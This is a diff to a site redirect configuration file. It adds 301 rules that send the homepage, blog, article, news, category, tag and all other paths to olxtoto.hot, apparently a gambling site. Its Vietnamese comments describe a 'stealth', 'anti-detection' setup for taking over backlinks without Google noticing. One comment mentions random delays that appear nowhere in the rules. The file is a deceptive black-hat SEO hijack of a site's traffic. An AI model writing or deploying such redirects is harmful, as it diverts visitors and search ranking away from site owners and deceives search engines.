@@ -1,1 +1,19 @@
-/* https://olxtoto.hot/:splat 301!
+# STEALTH 301 REDIRECT - Anti-Detection Setup
+# Chuyển tất cả backlink về olxtoto.hot mà không bị Google phát hiện
+
+# Random delay patterns để tránh footprint
+# Homepage
+/ https://olxtoto.hot/ 301!
+
+# Blog posts và articles (không giữ nguyên path)
+/blog/* https://olxtoto.hot/ 301!
+/article/* https://olxtoto.hot/ 301!
+/post/* https://olxtoto.hot/ 301!
+/news/* https://olxtoto.hot/ 301!
+
+# Category pages
+/category/* https://olxtoto.hot/ 301!
+/tag/* https://olxtoto.hot/ 301!
+
+# Tất cả path khác về homepage
+/* https://olxtoto.hot/ 301!
